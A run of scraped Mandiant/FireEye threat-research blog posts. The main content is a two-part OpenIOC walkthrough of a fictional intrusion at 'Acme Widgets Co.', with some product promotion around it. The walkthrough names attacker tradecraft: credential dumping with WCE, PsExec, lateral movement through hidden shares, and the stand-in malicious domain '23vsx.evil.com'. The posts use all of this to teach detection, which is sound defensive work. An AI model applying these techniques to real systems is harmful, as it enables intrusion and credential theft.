    I will be blogging on each of the six trends over the next two
    weeks; you can even view the videos we've developed for each trend
    as each blog post is published:</p> <p>
    <b>Malware Only Tells Half the Story</b>.</p> <p>Of the many systems
    compromised in each investigation, about half of them were never
    touched by attacker malware.</p> <p>In so many cases, the intruders
    logged into systems and took data from them (or used them as a
    staging point for exfiltration), but didn't install tools. It is
    ironic that the very systems that hold the data targeted by an
    attacker are probably the least likely to have malware installed on
    them. While finding the malware used in an intrusion is important,
    it is impossible to understand the full scope of an intrusion if
    this is the focal point of the investigation. We illustrate actual
    examples of this in the graphical spread on pages 6-7 of the
  report.</p> <p>What does this mean for victim organizations?</p>
    <p>You could start by looking for malware, but don't end there! A
    smart incident response process will seek to fully understand the
    scope of compromise and find all impacted systems in the
    environment. This could mean finding the registry entries that
    identify lateral movement, traces of deleted .rar files in
    unallocated space, or use of a known compromised account. It turns
    out that Mandiant has a <a
      href="/content/fireeye-www/en_US/mandiant/incident-response.html">product
    </a>that does all of this, but the footnote on page 5 is the only
    mention you'll see in the entire report (and even that was an
  afterthought).</p> <p>Thoughts and questions about this trend or the<a
      href="https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html">
    M-Trends</a> report?</p> </div>
http://www.fireeye.com/blog/threat-research/2012/05/mtrends-1-malware-tells-story.html2012-05-14T20:45:15.000Z2020-07-24T06:26:02.740ZExecutive Briefing in New York with Former Secretary of Homeland
Security Michael Chertoffnoemail@noemail.orgGrady Summers<div class="c00 c00v1">
  <p>On March 15, Mandiant hosted an executive briefing over breakfast
    in New York City. The location in the W Hotel in Downtown NYC
    overlooked the 9/11 Memorial and the rising One World Trade
    Center-an arresting view and a unique setting for this event.</p>
    <p>Former Secretary of Homeland Security Michael Chertoff kicked off
    the morning by discussing his perspective on the global threat
    landscape. He touched on Iran's cyber warfare capabilities in
    particular. He remarked on recent alleged Iranian attacks against
    the BBC and said that there is no point in debating the reality of
      <a href="http://www.bbc.co.uk/news/technology-17365416">cyber
    war</a>. If one side believes they are engaged in such a battle,
    then that is reality-and &quot;Iran clearly believes they are
    already participants in cyber war.&quot; He also noted that Iran's
    capabilities are already quite advanced. After being hit by Stuxnet,
    Iran views it as imperative to be prepared to respond in kind.</p>
    <p>It is always nice to see someone like Mr. Chertoff connecting the
    dots so articulately on a technical level. At one point, he
    commented about how important it was to not just look for malware.
    Smart responders, he said, need to look for all trace evidence of
    compromise in order to fully understand the scope of an incident.
    Coincidentally, this is trend #1 in our recent <a
      href="https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html">M-Trends
    report</a>, and Mr. Chertoff described the problem with a
    malware-centric approach perfectly.</p> <p>Richard Bejtlich spoke
    next and used a role-playing exercise to help the audience
    understand the challenge of responding to targeted threats. His
    premise was simple: &quot;Pretend I'm a law enforcement agent who
    comes to your office and tells you that you are compromised, and
    that I have your own internal documents as evidence. What do you do
  next?&quot;</p> <p>This provoked discussion and the audience started
    asking questions about the nature of the intrusion and what they
    should do to respond. As we explored the scenario through Q&amp;A,
    it became clear that most organizations lack the visibility they
    need to adequately respond to attacks. What about your organization?
    If you found out today that you had been the victim of a substantial
    breach, where would you look first? How would you validate the
    intrusion? How could you discover the scopeor identify what had been
  stolen?</p> <p>Those of you who have attended Mandiant events know
    that we are pretty light on the product pitches (we often don't
    mention our products at all). However, we do have a product that
    helps answer the questions that Richard was posing. <a
      href="/content/fireeye-www/en_US/mandiant/incident-response.html">Mandiant
      Intelligent Response</a> has helped hundreds of companies answer
    the question &quot;Now What??&quot; when they are on the receiving
    end of the scenario Richard outlined in New York.</p> </div>
http://www.fireeye.com/blog/threat-research/2012/04/executive-briefing-york-secretary-homeland-security.html2012-04-02T22:17:49.000Z2020-07-24T06:26:02.745ZNew Tactics. New Motives. New Services.noemail@noemail.orgJurgen Kutscher<div class="c00 c00v1">
  <p>Every day at <a href="http://www.mandiant.com/"
    target="_blank">Mandiant</a> we respond to some of the largest cyber
    security incidents around the world. This gives us a front-row seat
    to witness what works (and what doesn't) when it comes to finding
    attackers and preventing them from stealing our clients' data.</p>
    <p>Attackers' tactics and motives are evolving and as a result our
    security strategies also need to adapt. Today, <a
      href="http://www.fireeye.com/news-events/press-releases/read/fireeye-offers-new-mandiant-consulting-services-to-address-evolving-motives-and-tactics-of-advanced-threat-actors"
      target="_blank">we announced two new service offerings</a> that
    will further help our clients improve their protective, detective,
    and responsive security controls and leverage Mandiant's extensive
    experience responding to some of the most serious cyber security
  incidents.</p> <p>Our first new service offering addresses attackers'
    expanding motives. We are starting to see attackers with destructive
    motives and what could be more damaging than attacking a nation's
    critical infrastructure. Security incidents at critical
    infrastructure such as electric power grids, utilities and
    manufacturing companies can affect the lives of hundreds of
    thousands of people. Our new <a
      href="https://www.fireeye.com/content/fireeye-www/global/en/www/services/mandiant-industrial-control-system-gap-assessment.html"
      target="_blank">Industrial Control Systems (ICS) Security Gap
    Assessment</a> is specifically focused on helping these industries -
    and others that use SCADA systems - to assess their existing
    security processes for industrial control systems. The service helps
    identify security GAPs and provides specific recommendations to
    close those GAPs and safeguard critical infrastructure.</p> <p>Our
    second new service offering is designed to help organizations
    address the challenges they face as they build out their own
    internal security operations program and incident response teams.
    Many organizations want to enhance their internal capabilities
    beyond the traditional security operations centers (SOCs). Our new
      <a
      href="/content/fireeye-www/en_US/mandiant/cyber-defense-center-development.html"
      target="_blank">Cyber Defense Center Development</a> service helps
    organizations evolve their internal SOC by improving the visibility
    (monitoring and detection) and response capabilities (incident
    response) necessary to defend against advanced threats. This service
    looks at existing people, process, and technologies and identifies
    areas for improvement. It helps companies to identify and prioritize
    the alerts that require the most immediate action with the goal to
    reduce the mean time to remediation.</p> <p>If either of these new
    services sound like something that could help your organization <a
      href="http://www.mandiant.com/contact/" target="_blank">let us
  know</a>.</p> </div>http://www.fireeye.com/blog/threat-research/2014/10/tactics-motives-services.html2014-10-08T19:16:51.000Z2020-07-24T06:25:18.385ZInvestigating with Indicators of Compromise (IOCs) – Part IInoemail@noemail.orgWill Gibb<div class="c00 c00v1">
  <p>
    <i>Written by Will Gibb &amp; Devon Kerr</i></p> <p>In our blog post
      <a target="_blank"
      href="https://www.mandiant.com/blog/openioc-series-investigating-indicators-compromise-iocs-part/">&quot;Investigating
      with Indicators of Compromise (IOCs) - Part I</a>,&quot; we
    presented a scenario involving the &quot;Acme Widgets Co.,&quot; a
    company investigating an intrusion, and its incident responder,
    John. John's next objective is to examine the system
    &quot;ACMWH-KIOSK&quot; for evidence of attacker activity. Using the
    IOCs containing the tactics, techniques and procedures (TTPs) he
    developed during the analysis of &quot;ACM-BOBBO,&quot; John
    identifies the following IOC hits:</p> <a target="_blank"
      href="https://www.fireeye.com/content/dam/legacy/ammo/Table-1-IOC-hit-summary.jpg"><img
      width="819" height="616"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Table-1-IOC-hit-summary.jpg"
  class="size-full wp-image-5578" /></a>Table 1: IOC hit summary<p>After
    reviewing IOC hits in <a target="_blank"
    href="/content/fireeye-www/en_US/services/freeware/redline.html">Redline™</a>,
    John performs Live Response and put together the following timeline
    of suspicious activity on &quot;ACMWH-KIOSK&quot;.</p> <a
      href="https://www.fireeye.com/content/dam/legacy/ammo/Table-2-Summary-of-significant-artifacts1.jpg"><img
      width="817" height="593"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Table-2-Summary-of-significant-artifacts1.jpg"
  class="size-full wp-image-5585" /></a>Table 2: Summary of significant
    artifacts<p>John examines the timeline in order to surmise the
    following chain of activities:</p> <ul> <li>On October 15, 2013, at
      approximately 16:17:56 UTC, the attacker performed a type 3
      network logon, described <a target="_blank">here</a>, to
      &quot;ACMWH-KIOSK&quot; from &quot;ACM-BOBBO&quot; using the ACME
      domain service account, &quot;backupDaily.&quot;</li> <li>A few
      seconds later, the attacker copied two executables,
      &quot;acmCleanup.exe&quot; and &quot;msspcheck.exe,&quot; from
      &quot;ACM-BOBBO&quot; to &quot;C:$RECYCLE.BIN.&quot;</li> </ul>
    <p>By generating MD5 hashes of both files, John determines that
    &quot;acmCleanup.exe&quot; is identical to the similarly named file
    on &quot;ACM-BOBBO&quot;, which means it won't require malware
    analysis. Since the MD5 hash of &quot;msspcheck.exe&quot; was not
    previously identified, John sends binary to a malware analyst, whose
    analysis reveals that &quot;msspcheck.exe&quot; is a variant of the
    &quot;acmCleanup.exe&quot; malware.</p> <ul> <li>About a minute
      later, at 16:19:02 UTC, the attacker executed the Sysinternals
      PsExec remote command execution utility, which ran for
      approximately three minutes.</li> <li>During this time period,
      event logs recorded the start and stop of the &quot;WCE
      SERVICE&quot; service, which corresponds to the execution of the
      Windows Credentials Editor (WCE).</li> </ul> <p>John can assume
    PsExec was used to execute WCE, which is reasonable given the
    timeline of events and artifacts present on the system.</p> <p>About
    seven minutes, later the registry recorded the modification of a Run
    key associated with persistence for &quot;msspcheck.exe.&quot;
    Finally, at 16:48:11 UTC, the attacker logged off from
  &quot;ACMWH-KIOSK&quot;.</p> <p>John found no additional evidence of
    compromise. Since the IOCs are living documents, John's next step is
    to update his IOCs with relevant findings from his investigation of
    the kiosk system. John updates the &quot;acmCleanup.exe
    (BACKDOOR)&quot; IOC with information from the
    &quot;msspcheck.exe&quot; variant of the attacker's backdoor
  including:</p> <ul> <li>File metadata like filename and MD5.</li>
      <li>A uniquely named process handle discovered by John's malware
    analyst.</li> <li>A prefetch entry for the &quot;msspcheck.exe&quot;
    binary.</li> <li>Registry artifacts associated with persistence of
    &quot;msspcheck.exe.&quot;</li> </ul> <p>From there, John
    double-checks the uniqueness of the additional filename with some
    search engine queries. He can confirm that &quot;msspcheck.exe&quot;
    is a unique filename and update his &quot;acmCleanup.exe
    (BACKDOOR)&quot; IOC. By updating his existing IOC, John ensures
    that he will be able to identify evidence attributed to this
    specific variant of the backdoor.</p> <p>Changes to the original IOC
    have been indicated in green.</p> <p>The updated IOC can be seen
  below:</p> <a target="_blank"
      href="https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png"><img
      width="492" height="591"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png"
  class="size-full wp-image-5576" /></a>Figure 1: Augmented IOC for
  acmCleanup.exe (BACKDOOR)<p>John needs additional information before
    he can start to act. He knows two things about the attacker that
    might be able to help him out:</p> <ul> <li>The attacker is using a
      domain service account to perform network logons.</li> <li>The
      attacker has been using WCE to obtain credentials and the
      &quot;WCE SERVICE&quot; service appears in event logs.</li> </ul>
    <p>John turns to his security event and incident management (SEIM)
    system, which aggregates logs from his domain controllers,
    enterprise antivirus and intrusion detection systems. A search of
    type 3 network logons using the &quot;backupDaily&quot; domain
    account turns up 23 different systems accessed using that account.
    John runs another query for the &quot;WCE SERVICE&quot; and sees
    that logs from 3 domain controllers contain that service event. John
    needs to look for IOCs across all Acme machines in a short period of
  time.</p> </div>
http://www.fireeye.com/blog/threat-research/2014/03/investigating-indicators-compromise-iocs-part-ii.html2014-03-06T01:42:20.000Z2020-07-24T00:03:11.899ZOpenIOC Series: Investigating with Indicators of Compromise (IOCs) –
Part Inoemail@noemail.orgWill Gibb<div class="c00 c00v1">
  <p>
    <i>Written by Devon Kerr &amp; Will Gibb</i></p> <p>The <a
      target="_blank"
      href="https://www.mandiant.com/blog/basics-series-openioc/">Back
      to Basics: OpenIOC blog series</a> previously discussed how
    Indicators of Compromise (IOCs) can be used to codify information
    about malware or utilities and describe an attacker's methodology.
    Also touched on were the parts of an IOC, such as the metadata,
    references, and definition sections. This blog post will focus on
    writing IOCs by providing a common investigation scenario, following
    along with an incident response team as they investigate a
    compromise and assemble IOCs.</p> <p>Our scenario involves a
    fictional organization, &quot;Acme Widgets Co.&quot;, which designs,
    manufactures and distributes widgets. Last week, this organization
    held a mandatory security-awareness training that provided attendees
    with an overview of common security topics including password
    strength, safe browsing habits, email phishing and the risks of
    social media. During the section on phishing, one employee expressed
    concern that he may have been phished recently. Bob Bobson, an
    administrator, indicated that some time back he'd received a strange
    email about a competitor's widget and was surprised that the PDF
    attachment wouldn't open. A member of the security operations staff,
    John Johnson, was present during the seminar and quickly initiated
    an investigation of Bob's system using the Mandiant <a
      target="_blank"
    href="/content/fireeye-www/en_US/services/freeware/redline.html">Redline™</a>
    host investigation tool. John used Redline to create a portable
    collectors configured to obtain live response data from Bob's system
    which included file system metadata, the contents of the registry,
    event logs, web browser history, as well as service information.</p>
    <p>John ran the collectors on Bob's system and brought the data back
    to his analysis workstation for review. Through discussions with
    Bob, John learned that the suspicious e-mail likely arrived on
    October 13, 2013.</p> <p>After initial review of the evidence, John
    assembled the following timeline of suspicious activity on the
  system.</p> <a
      href="https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Summary-of-significant-artifacts.jpg"><img
      width="746" height="500"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Table-1-Summary-of-significant-artifacts.jpg"
  class=" wp-image-5403 " /></a>Table 1: Summary of significant
    artifacts<p>Based on this analysis, John pieced together a
    preliminary narrative: The attacker sent a spear-phishing email to
    Bob which contained a malicious PDF attachment,
    &quot;Ultrawidget.pdf&quot;, which Bob saved to the desktop on
    October 10, 2013, at 20:19:07 UTC. Approximately five minutes later,
    at 20:24:44 UTC, the file
    &quot;C:WINDOWSSysWOW64acmCleanup.exe&quot; was created as well as a
    Run key used for persistence. These events were likely the result of
    Bob opening the PDF. John sent the PDF to a malware analyst to
    determine the nature of the exploit used to infect Bob's PC.</p>
    <p>The first IOC John writes describes the malware identified on
    Bob's PC, &quot;acmCleanup.exe&quot;, as well as the malicious PDF.
    IOCs sometimes start out as rudimentary - looking for the known file
    hashes, filenames and persistence mechanisms of the malware
    identified. Here is what an initial IOC looks like:</p> <a
      href="https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png"><img
      width="549" height="163"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Initial-IOC-for-acmCleanup.exe-BACKDOOR.png"
  class="size-full wp-image-5402" /></a>Figure 1: Initial IOC for
  acmCleanup.exe (BACKDOOR)<p>As analysis continues, these IOCs are
    updated and improved - incorporating indicator terms from malware
    and intelligence analysis as well as being refined based on the
    environment. In this sense, the IOC is a living document. For
    example, additional analysis may reveal more registry key
    information, additional files which may be written to disk, or
    information for identifying the malware in memory. Here is the same
    IOC, after augmenting it with the results of malware analysis:</p>
    <a
      href="https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png"><img
      width="544" height="462"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Augmented-IOC-for-acmCleanup.exe-BACKDOOR.png"
  class="size-full wp-image-5401" /></a>Figure 2: Augmented IOC for
  acmCleanup.exe (BACKDOOR)<p>The augmented IOC will continue to
    identify the exact malware discovered on Bob's PC. This improved IOC
    will also identify malware which has things in common with that
  backdoor:</p> <ul> <li>Malware which uses the same Mutex, a process
      attribute that will prevent the machine from being infected
      multiple times with the same backdoor</li> <li>Malware which
      performs DNS queries for the malicious domain
    &quot;23vsx.evil.com&quot;</li> <li>Malware which has a specific set
      of import functions; in this case which correspond to reverse
      shell and keylogger functionality</li> </ul> <p>Beginning on
    October 11, the attacker accessed the system and executed the
    Windows command &quot;ipconfig&quot; at 20:24:00 UTC, resulting in
    the creation of a prefetch file. Approximately five minutes later,
    the attacker began uploading files to &quot;C:$RECYCLE.BIN&quot;.
    Based on review of their MD5 hashes, three files
    (&quot;wce.exe&quot;, &quot;getlsasrvaddr.exe&quot;,
    &quot;update.exe&quot;) were identified as known credential dumping
    utilities while others (&quot;filewalk32.exe&quot;,
    &quot;rar.exe&quot;) were tools for performing file system searches
    and creating WinRAR archives. These items should be recorded in an
    IOC, as a representation of an attacker's tools, techniques and
    procedures (TTPs). It is important to know that an attacker is
    likely to have interacted with many more systems than were infected
    with malware; for this reason it is crucial to look for evidence
    that an attacker has accessed systems. Some of the most common
    activities attackers perform on these systems include
    password-dumping, reconnaissance and data theft.</p> <p>Seeing that
    the attacker had staged file archives and utilities in the
    &quot;$Recycle.Bin&quot; folder, John also created an IOC to find
    artifacts present there. This IOC was designed to identify files in
    the root of the &quot;$Recycle.Bin&quot; directory; or to identify
    if a user (notably, the attacker) tried to access the
    &quot;$Recycle.Bin&quot; folder by manually typing it in the address
    bar of Explorer by checking TypedPaths in the Registry. This is an
    example of encapsulating an attacker's TTPs in an OpenIOC form.</p>
    <a
      href="https://www.fireeye.com/content/dam/legacy/ammo/Figure-34.png"><img
      width="357" height="281"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Figure-34.png"
  class="size-full wp-image-5400" /></a>Figure 3: IOC for Unusual Files
  in &quot;C:RECYCLER&quot; and &quot;C:$RECYCLE.BIN&quot;
    (Methodology)<p>On October 15, 2013, at 12:15:37 UTC, the
    Sysinternals PsExec utility was created in
    &quot;C:$RECYCLE.BIN&quot;. Approximately four hours later, at
    16:11:03 UTC, the attacker used the Internet Explorer browser to
    access text files located in &quot;C:$RECYCLE.BIN&quot;. Between
    16:11:03 UTC and 16:11:06 UTC, the attacker accessed two text files
    which were no longer present on the system. At 16:17:55 UTC, the
    attacker mounted the remote hidden share
    &quot;\10.20.30.101C$&quot;. At 16:20:29 UTC, the attacker executed
    the Windows &quot;tree&quot; command, resulting in the creation of a
    prefetch file, a command which produces a filesystem listing. At
    17:37:37 UTC, the attacker created one WinRAR archive,
    &quot;C:$Recycle.Bina.rar&quot; which contained two text files,
    &quot;c.txt&quot; and &quot;a.txt&quot;. These text files contained
    output from the Windows &quot;tree&quot; and &quot;ipconfig&quot;
    commands. No further evidence was present on the system. John noted
    that the earliest event log entries present on the system start
    approximately two minutes after the creation of &quot;a.rar&quot;.
    It is likely that the attacker cleared the event logs before
    disconnecting from the system.</p> <p>John identified the lateral
    movement to the 10.20.30.101 host, from &quot;ACM-BOBBO&quot;
    through registry keys that recorded the mount of the hidden C$
    share. By recording this type of artifact in an IOC, John will be
    able to quickly see if the attacker has pivoted to another part of
    the Acme Widgets Co. network when investigating 10.20.30.101. He
    included artifacts looking for other common hidden shares such as
    IPC$ and ADMIN$. The effectiveness of an IOC may be influenced by
    the environment the IOC was created for. This IOC, for example, may
    generate a significant number of false-positives in an environment
    where these hidden shares are legitimately used. At Acme Widgets
    Co., however, the use of hidden shares is considered highly
  suspicious.</p> <a
      href="https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-IOC-for-Lateral-Movement-Methodology-2.png"><img
      width="360" height="120"
      src="https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-IOC-for-Lateral-Movement-Methodology-2.png"
      alt="Figure 4 IOC for Lateral Movement (Methodology)"
  class="size-full wp-image-5418" /></a>Figure 4 IOC for Lateral
  Movement (Methodology)<p>At the end of the day, John authored three
    new IOCs based on his current investigation. He knows that if he
    records the artifacts he identified from his investigation into the
    &quot;ACM-BOBBO&quot; system, he can apply that knowledge to the
    investigation of the host at 10.20.30.101. Once he collects
    information on 10.20.30.101 with his Redline portable collector,
    he'll be able to match IOCs against the Live Response data, which
    will let him identify known artifacts quickly prior to beginning
    Live Response analysis. Although John is using these IOCs to search
    systems individually, these same IOCs could be used to search for
    evidence of attacker activity across the enterprise. Armed with this
    set of IOCs, John sets out to hunt for evil on the host at
  &quot;10.20.30.101&quot;.</p> <p>Stay tuned for our next blog post,
    seeing how this investigation develops.</p> </div>
http://www.fireeye.com/blog/threat-research/2013/12/openioc-series-investigating-indicators-compromise-iocs.html2013-12-16T20:58:10.000Z2020-07-24T00:03:11.884ZBest of the Best in 2013: The Armorynoemail@noemail.orgHelena Brito<div class="c00 c00v1">
  <p>Everyone likes something for free. And there is no better place to
    go to get free analysis, intelligence and tools than <a
      target="_blank"
      href="/content/fireeye-www/en_US/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/armory/">The
    Armory</a> on M-Unition. During the past year, we've offered
    intelligence and analysis on new threat activity, sponsored open
    source projects and offered insight on free tools like <a
      target="_blank"
    href="/content/fireeye-www/en_US/services/freeware/redline.html">Redline™</a>,
    all of which has been highlighted on our blog.</p> <p>In case you've
    missed it, here are some of our most popular posts:</p> <p>
    <b>
      <a target="_blank"
        href="https://www.mandiant.com/blog/challenges-malware-intelligence-analysis-similar-network-protocols-backdoors-threat-groups/">Challenges
        in Malware and Intelligence Analysis: Similar Network Protocols,
        Different Backdoors and Threat Groups</a></b></p> <b> </b>
  <p>
    <b></b>In this post, Mandiant's Intel shares insight on threat
    activity. Specifically, two separate APT groups, using two different
    backdoors that had very similar networking protocols. Read more to
    learn what they found.</p> <p>
    <b>
      <a target="_blank"
        href="https://www.mandiant.com/blog/mandiant-releases-owasp-broken-web-applications-project-vm-version-11/">New
        Release: OWASP Broken Web Applications Project VM Version
  1.1</a></b></p> <b> </b>
  <p>
    <b></b>Chuck Willis overviews version 1.1 of the Mandiant-sponsored
      <a target="_blank" href="http://www.owaspbwa.org/">OWASP Broken
      Web Applications Project</a> Virtual Machine (VM). If you are not
    familiar with this open source project, it provides a freely
    downloadable VM containing more than 30 web applications with known
    or intentional security vulnerabilities. Many people use the VM for
    training or self-study to learn about web application security
    vulnerabilities, including how to find them, exploit them, and fix
    them. It can also be used for other purposes such as testing web
    application assessment tools and techniques or understanding
    evidence of web application attacks.</p> <p>
    <b>
      <a target="_blank"
        href="https://www.mandiant.com/blog/basics-series-openioc/">Back
        to Basics Series: OpenIOC</a></b></p> <b> </b>
  <p>
    <b></b>Will Gibb and a few of his colleagues at Mandiant embark on a
    series going back to the basics and looking deeper at OpenIOC - how
    we got where we are today, how to make and use IOCs, and the future
    of OpenIOC.</p> <p>Check out related posts here: <a target="_blank"
      href="https://www.mandiant.com/blog/history-openioc/">The History
      of OpenIOC</a>, <a target="_blank"
      href="https://www.mandiant.com/blog/openioc-basics/">Back to the
    Basics</a>, <a target="_blank"
      href="https://www.mandiant.com/blog/live-black-hat-2013-openioc-iocwriter-free-tools/">OpenIOC,
      IOC Writer and Other Free Tools.</a></p> <p>
    <b>
      <a target="_blank"
        href="https://www.mandiant.com/blog/live-black-hat-2013-redline-turbo-talk-andarsenal/">Live
        from Black Hat 2013: Redline, Turbo Talk, and
  Arsenal</a></b></p> <b> </b>
  <p>
    <b></b>Sitting poolside at Black Hat USA 2013, Mandiant's Kristen
    Cooper chats with Ted Wilson about <a target="_blank"
    href="https://www.mandiant.com/blog/redline-answering-questions/">Redline</a>
    in this latest podcast. Ted leads the development of Redline where
    he provides innovative investigative features and capabilities
    enabling both the seasoned investigator and those with considerably
    less experience to answer the question, &quot;have you been
  compromised?&quot;</p> <p>
    <a target="_blank"
        href="https://www.mandiant.com/blog/utilities-industry-cyber-targeting-scope/"><b>Utilities
        Industry in the Cyber Targeting Scop</b>e</a></p> <p>Our intel
    team is back again, this time with an eye on the utilities industry.
    As part of our incident response and managed defense work, Mandiant
    has observed Chinese APT groups exploiting the computer networks of
    U.S. utilities enterprises servicing or providing electric power to
    U.S. consumers, industry, and government. The most likely targets
    for data theft in this industry include smart grid technologies,
    water and waste management expertise, and negotiations information
    related to existing or pending deals involving Western utilities
    companies operating in China.</p> </div>
http://www.fireeye.com/blog/threat-research/2013/12/2013-armory.html2013-12-20T21:48:44.000Z2020-07-24T00:03:11.912Z